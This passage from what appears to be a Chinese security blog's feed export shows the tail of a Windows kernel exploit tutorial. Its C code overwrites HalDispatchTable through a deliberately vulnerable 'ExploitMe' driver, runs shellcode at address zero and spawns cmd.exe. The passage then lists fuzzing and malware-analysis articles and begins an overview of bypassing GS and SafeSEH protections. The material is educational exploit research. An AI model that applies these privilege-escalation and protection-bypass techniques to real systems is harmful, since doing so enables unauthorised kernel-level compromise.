(ULONG)MappedBase;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                (ULONG)HalDispatchTable += ImageBase;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				&lt;span class=&quot;comment&quot;&gt;// HalDispatchTable 地址 + 4 = HalQuerySystemInformation 函数地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                (ULONG)xHalQuerySystemInformation = (ULONG)HalDispatchTable + &lt;span class=&quot;keyword&quot;&gt;sizeof&lt;/span&gt;(ULONG);  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot; *                                                                            \n&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                       &lt;span class=&quot;string&quot;&gt;&quot; * HalDispatchTable - 0x%.8X                                               \n&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                       &lt;span class=&quot;string&quot;&gt;&quot; * xHalQuerySystemInformation - 0x%.8X                                     \n&quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                       HalDispatchTable,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                       xHalQuerySystemInformation);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				&lt;span class=&quot;comment&quot;&gt;// 卸载进程中的内核模块&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                LdrUnloadDll((PVOID)MappedBase);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                RtlInitUnicodeString(&amp;amp;DeviceName, &lt;span class=&quot;string&quot;&gt;L&quot;\\Device\\ExploitMe&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                ObjectAttributes.Length = &lt;span class=&quot;keyword&quot;&gt;sizeof&lt;/span&gt;(OBJECT_ATTRIBUTES);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                ObjectAttributes.RootDirectory = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                ObjectAttributes.ObjectName = &amp;amp;DeviceName;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                ObjectAttributes.Attributes = OBJ_CASE_INSENSITIVE;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                ObjectAttributes.SecurityDescriptor = &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                ObjectAttributes.SecurityQualityOfService = &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				&lt;span class=&quot;comment&quot;&gt;// 获取驱动设备句柄&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                NtStatus = NtCreateFile(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                        &amp;amp;DeviceHandle,     &lt;span class=&quot;comment&quot;&gt;// FileHandle&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                        FILE_READ_DATA |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                        FILE_WRITE_DATA,   &lt;span class=&quot;comment&quot;&gt;// DesiredAccess&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                        &amp;amp;ObjectAttributes, &lt;span class=&quot;comment&quot;&gt;// ObjectAttributes&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                        &amp;amp;IoStatusBlock,    &lt;span class=&quot;comment&quot;&gt;// IoStatusBlock&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                        NULL,              &lt;span class=&quot;comment&quot;&gt;// AllocationSize OPTIONAL&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                        &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,                 &lt;span class=&quot;comment&quot;&gt;// FileAttributes&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                        FILE_SHARE_READ |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                        FILE_SHARE_WRITE, &lt;span class=&quot;comment&quot;&gt;// ShareAccess&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                        FILE_OPEN_IF,     &lt;span class=&quot;comment&quot;&gt;// CreateDisposition&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                        &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,                &lt;span class=&quot;comment&quot;&gt;// CreateOptions&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                        NULL,             &lt;span class=&quot;comment&quot;&gt;// EaBuffer OPTIONAL&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                        &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);               &lt;span class=&quot;comment&quot;&gt;// EaLength&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(	&lt;span class=&quot;string&quot;&gt;&quot; * \n&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;						&lt;span class=&quot;string&quot;&gt;&quot; * NtCreateFile:&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				ShowAlertMsg();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				&lt;span class=&quot;comment&quot;&gt;// 令输出缓冲区指针指向HalQuerySystemInformation函数地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				*(DWORD *)g_ressdtOutputBuffer=(DWORD)xHalQuerySystemInformation;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                NtStatus = NtDeviceIoControlFile(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                                 DeviceHandle,			&lt;span class=&quot;comment&quot;&gt;// FileHandle&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                                 NULL,					&lt;span class=&quot;comment&quot;&gt;// Event&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                                 NULL,					&lt;span class=&quot;comment&quot;&gt;// ApcRoutine&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                                 NULL,					&lt;span class=&quot;comment&quot;&gt;// ApcContext&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                                 &amp;amp;IoStatusBlock,		&lt;span class=&quot;comment&quot;&gt;// IoStatusBlock&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                                 IOCTL_CODE,			&lt;span class=&quot;comment&quot;&gt;// IoControlCode&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                                 g_InputBuffer,			&lt;span class=&quot;comment&quot;&gt;// InputBuffer&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                                 &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;,						&lt;span class=&quot;comment&quot;&gt;// InputBufferLength&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                                 g_ressdtOutputBuffer,  &lt;span class=&quot;comment&quot;&gt;// OutputBuffer&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                                 &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;);					&lt;span class=&quot;comment&quot;&gt;// OutBufferLength&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot; * NtDeviceIoControlFile:&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				ShowAlertMsg();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                ShellCodeAddress = (PVOID)&lt;span class=&quot;keyword&quot;&gt;sizeof&lt;/span&gt;(ULONG);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                NtStatus = NtAllocateVirtualMemory(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                                   NtCurrentProcess(),      &lt;span class=&quot;comment&quot;&gt;// ProcessHandle&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                                   &amp;amp;ShellCodeAddress,       &lt;span class=&quot;comment&quot;&gt;// BaseAddress&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                                   &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,                       &lt;span class=&quot;comment&quot;&gt;// ZeroBits&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                                   &amp;amp;ShellCodeSize,          &lt;span class=&quot;comment&quot;&gt;// AllocationSize&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                                   MEM_RESERVE | &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                                   MEM_COMMIT |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                                   MEM_TOP_DOWN,            &lt;span class=&quot;comment&quot;&gt;// AllocationType&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                                   PAGE_EXECUTE_READWRITE); &lt;span class=&quot;comment&quot;&gt;// Protect&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot; * NtAllocateVirtualMemory:&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				ShowAlertMsg();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                RtlCopyMemory(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                              ShellCodeAddress,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                              (PVOID)MyShellCode,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                              ShellCodeSize);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot; * RtlMoveMemory:&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				ShowAlertMsg();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				&lt;span class=&quot;comment&quot;&gt;// 通过调用NtQueryIntervalProfile函数来执行0x0上的ring0 shellcode&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                NtStatus = NtQueryIntervalProfile(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                                  ProfileTotalIssues, &lt;span class=&quot;comment&quot;&gt;// Source&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                                  NULL);              &lt;span class=&quot;comment&quot;&gt;// Interval&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot; * NtQueryIntervalProfile:&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				ShowAlertMsg();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                NtStatus = NtClose(DeviceHandle);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot; * NtClose:&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				ShowAlertMsg();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot; **************************************************************************\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				WinExec(&lt;span class=&quot;string&quot;&gt;&quot;cmd.exe&quot;&lt;/span&gt; , SW_SHOW);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot; * Exploit Successful！\n\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				getchar();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return FALSE;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;********************************** END ********************************************&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;0x3-结尾&quot;&gt;&lt;a href=&quot;#0x3-结尾&quot; class=&quot;headerlink&quot; title=&quot;0x3 结尾&quot;&gt;&lt;/a&gt;0x3 结尾&lt;/h3&gt;&lt;p&gt;写这个exploit，时间更多地是花在调试上面，遇到的主要问题就是写exploit时，在复制shellcode到分配的内存地址时，由于复制的字节数过大，导致因后面的内存不可读而显错，经过多次调试，将其调整为0xA00大小最为合适，另一个问题是在编译样章上的源码遇到的问题，由于粗心将符号链接名中的两斜杆\落掉了，导致编译成功后，可加载但不可启动，经过多次的内核调试才找到原因。很多问题都是如此，在找到问题根源后，总会令人大抱不值不该！本文只是内核漏洞利用的入门教程，希望能对初学者有所帮助！&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-漏洞分析：&quot;&gt;&lt;a href=&quot;#0x01-漏洞分析：&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞分析：&quot;&gt;&lt;/a&gt;0x01 漏洞分析：&lt;/h3&gt;&lt;p&gt;用工具加载驱动后，开启windbg进行内核调试，先找到驱动的IoContro
    
    </summary>
    
      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="内核" scheme="http://riusksk.github.io/tags/%E5%86%85%E6%A0%B8/"/>
    
  </entry>
  
  <entry>
    <title>基于SPIKE的网络协议Fuzzing技术</title>
    <link href="http://riusksk.github.io/2011/12/30/spike-fuzz/"/>
    <id>http://riusksk.github.io/2011/12/30/spike-fuzz/</id>
    <published>2011-12-29T16:00:00.000Z</published>
    <updated>2016-06-26T10:29:29.000Z</updated>
    
    <content type="html">

	&lt;div class=&quot;row&quot;&gt;
	  &lt;iframe src=&quot;http://nagland.github.io/viewer/web/viewer.html?val=http://riusksk.me/media/spike_fuzz.pdf&quot; style=&quot;width:100%; height:550px&quot;&gt;&lt;/iframe&gt;
	&lt;/div&gt;



</content>
    
    <summary type="html">
    
      

	&lt;div class=&quot;row&quot;&gt;
	  &lt;iframe src=&quot;http://nagland.github.io/viewer/web/viewer.html?val=http://riusksk.me/media/spike_fuzz.pdf&quot; style=&quot;widt
    
    </summary>
    
      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="Fuzzing" scheme="http://riusksk.github.io/tags/Fuzzing/"/>
    
      <category term="漏洞" scheme="http://riusksk.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>多平台恶意软件行为分析技巧</title>
    <link href="http://riusksk.github.io/2011/08/20/malware-analyze/"/>
    <id>http://riusksk.github.io/2011/08/20/malware-analyze/</id>
    <published>2011-08-19T16:00:00.000Z</published>
    <updated>2016-06-18T12:17:28.000Z</updated>
    
    <content type="html">

	&lt;div class=&quot;row&quot;&gt;
	  &lt;iframe src=&quot;http://nagland.github.io/viewer/web/viewer.html?val=http://riusksk.me/media/malware_analyze.pdf&quot; style=&quot;width:100%; height:550px&quot;&gt;&lt;/iframe&gt;
	&lt;/div&gt;



</content>
    
    <summary type="html">
    
      

	&lt;div class=&quot;row&quot;&gt;
	  &lt;iframe src=&quot;http://nagland.github.io/viewer/web/viewer.html?val=http://riusksk.me/media/malware_analyze.pdf&quot; style=
    
    </summary>
    
      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="恶意软件" scheme="http://riusksk.github.io/tags/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>Windows溢出保护原理与绕过方法概览</title>
    <link href="http://riusksk.github.io/2011/03/26/win-overflow-protect-and-bypass/"/>
    <id>http://riusksk.github.io/2011/03/26/win-overflow-protect-and-bypass/</id>
    <published>2011-03-25T16:00:00.000Z</published>
    <updated>2016-06-21T02:37:36.000Z</updated>
    
    <content type="html">&lt;p&gt;By  : riusksk（泉哥）&lt;br&gt;Blog: &lt;a href=&quot;http://riusksk.blogbus.com&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://riusksk.blogbus.com&lt;/a&gt;&lt;br&gt;Data: 第1版：2010/10/26&lt;br&gt;      第2版：2011/3/26&lt;/p&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;从20世纪80年代开始，在国外就有人开始讨论关于溢出的攻击方式。但是在当时并没有引起人们的注意，直至后来经一些研究人员的披露后，特别是著名黑客杂志Phrack上面关于溢出的经典文章，引领许多人步入溢出研究的行列，从此关于缓冲区溢出的问题才为人们所重视。随着溢出研究的深入，网上开始出现很多关于溢出攻击教程，揭露了许多溢出利用技术，特别是经典的call/jmp esp，借此溢出攻击案例层出不穷。这也引起了微软的重视，他们在windows系统及VC++编译器上加入了各种溢出保护机制，以试图阻止这类攻击，可惜每次公布溢出保护机制之后，不久就有人公布绕过方法。MS每次都称某保护机制将成为溢出利用的末日，可惜每次都被终结掉。既而，黑客与微软之间的溢出斗争一直持续着。更多关于windows溢出的历史，可参见由Abysssec安全组织编写的文章&lt;a href=&quot;http://www.abysssec.com/blog/2010/05/past-present-future-of-windows-exploitation/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;《Past，Present，Future of Windows Exploitation》&lt;/a&gt;。在本篇文章中主要揭露了windows平台上的各种溢出保护机制原理以及绕过方法，具体内容参见下文。&lt;/p&gt;
&lt;h2 id=&quot;一、GS编译选项&quot;&gt;&lt;a href=&quot;#一、GS编译选项&quot; class=&quot;headerlink&quot; title=&quot;一、GS编译选项&quot;&gt;&lt;/a&gt;一、GS编译选项&lt;/h2&gt;&lt;h3 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h3&gt;&lt;p&gt;通过VC++编译器在函数前后添加额外的处理代码，前部分用于由伪随机数生成的cookie并放入.data节段，当本地变量初始化，就会向栈中插入cookie，它位于局部变量和返回地址之间：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┏━━━━━━━━┓内存低地址
┃   局部变量    ┃▲
┣━━━━━━━━┫┃
┃security_cookie ┃┃
┣━━━━━━━━┫┃栈
┃  入栈寄存器   ┃┃生
┣━━━━━━━━┫┃长                       
┃     SEH节点  ┃┃方
┣━━━━━━━━┫┃向
┃    返回地址   ┃┃
┣━━━━━━━━┫┃
┃    函数参数   ┃┃
┣━━━━━━━━┫┃
┃    虚函数表   ┃┃
┗━━━━━━━━┛内存高地址
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;经GS编译后栈中局部变量空间分配情况：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sub   esp,24h&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mov   eax,dword ptr [___security_cookie (408040h)]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;xor   eax,dword ptr [esp+24h]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mov   dword ptr [esp+20h],eax&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在函数尾部的额外代码用于在函数返回时，调用security_check_cookie（）函数，以判断cookie是否被更改过，当函数返回时的情况如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;mov   ecx,dword ptr [esp+20h]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;xor   ecx,dword ptr [esp+24h]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;add   esp,24h&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;jmp   __security_check_cookie (4010B2h)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在缓冲区溢出利用时，如果将恶意代码从局部变量覆盖到返回地址，那么自然就会覆写cookie，当检测到与原始cookie不同时（也就是比较上面408040h与4010B2h两处cookie值的比较），就会触发异常，最后终止进程。&lt;/p&gt;
&lt;h3 id=&quot;绕过方法：&quot;&gt;&lt;a href=&quot;#绕过方法：&quot; class=&quot;headerlink&quot; title=&quot;绕过方法：&quot;&gt;&lt;/a&gt;绕过方法：&lt;/h3&gt;&lt;h4 id=&quot;1-猜测-计算cookie&quot;&gt;&lt;a href=&quot;#1-猜测-计算cookie&quot; class=&quot;headerlink&quot; title=&quot;1.猜测/计算cookie&quot;&gt;&lt;/a&gt;1.猜测/计算cookie&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;http://www.uninformed.org/?v=7&amp;amp;a=2&amp;amp;t=html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Reducing the Effective Entropy of GS Cookies&lt;/a&gt;&lt;br&gt;至从覆盖SEH的方法出现后，这种方法目前已基本不用了，它没有后面的方法来得简便。&lt;/p&gt;
&lt;h4 id=&quot;2-覆盖SEH&quot;&gt;&lt;a href=&quot;#2-覆盖SEH&quot; class=&quot;headerlink&quot; title=&quot;2.覆盖SEH&quot;&gt;&lt;/a&gt;2.覆盖SEH&lt;/h4&gt;&lt;p&gt;由于当security_check_cookie（）函数检测到cookie被更改后，会检查是否安装了安全处理例程，也就是SEH节点中保存的指针，如果没有，那么由系统的异常处理器接管，因此我们可以通过（pop pop ret）覆盖SEH来达到溢出的目的。但对于受SafeSEH保护的模块，就可能会导致exploit失效，关于它的绕过在后续部分再述。&lt;br&gt;辅助工具：OD插件safeSEH、pattern_create、pattern_offset、msfpescan、memdump&lt;/p&gt;
&lt;h4 id=&quot;3-覆盖虚表指针&quot;&gt;&lt;a href=&quot;#3-覆盖虚表指针&quot; class=&quot;headerlink&quot; title=&quot;3.覆盖虚表指针&quot;&gt;&lt;/a&gt;3.覆盖虚表指针&lt;/h4&gt;&lt;p&gt;堆栈布局：[局部变量][cookie][入栈寄存器][返回地址][参数][虚表指针]&lt;br&gt;当把虚表指针覆盖后，由于要执行虚函数得通过虚表指针来搜索，即可借此劫持eip。&lt;/p&gt;
&lt;h2 id=&quot;二、SafeSEH&quot;&gt;&lt;a href=&quot;#二、SafeSEH&quot; class=&quot;headerlink&quot; title=&quot;二、SafeSEH&quot;&gt;&lt;/a&gt;二、SafeSEH&lt;/h2&gt;&lt;h3 id=&quot;原理-1&quot;&gt;&lt;a href=&quot;#原理-1&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h3&gt;&lt;p&gt;为了防止SEH节点被攻击者恶意利用，微软在．net编译器中加入/safeseh编译选项引入SafeSEH技术。编译器在编译时将PE文件所有合法的异常处理例程的地址解析出来制成一张表，放在PE文件的数据块(LQAJ)一C0N—FIG)中，并使用shareuser内存中的一个随机数加密，用于匹配检查。如果该PE文件不支持safeSEH，则表的地址为0。当PE文件被系统加载后，表中的内容被加密保存到ntdl1．dll模块的某个数据区。在PE文件运行期间，如果发生异常需要调用异常处理例程，系统会逐个检查该例程在表中是否有记录：如果没有则说明该例程非法，进而不执行该异常例程。&lt;/p&gt;
&lt;h3 id=&quot;绕过方法&quot;&gt;&lt;a href=&quot;#绕过方法&quot; class=&quot;headerlink&quot; title=&quot;绕过方法&quot;&gt;&lt;/a&gt;绕过方法&lt;/h3&gt;&lt;h4 id=&quot;1-利用堆地址覆盖SEH结构&quot;&gt;&lt;a href=&quot;#1-利用堆地址覆盖SEH结构&quot; class=&quot;headerlink&quot; title=&quot;1.利用堆地址覆盖SEH结构&quot;&gt;&lt;/a&gt;1.利用堆地址覆盖SEH结构&lt;/h4&gt;&lt;p&gt;在禁用DEP的进程中，异常分发例程允许SEH handler位于某些非映像页面，除栈空间之外。这也就意味着我们可以把shellcode放置在堆中，并通过覆盖SEH跳至堆空间以执行shellcode，这样即可完全绕过safeseh保护。&lt;/p&gt;
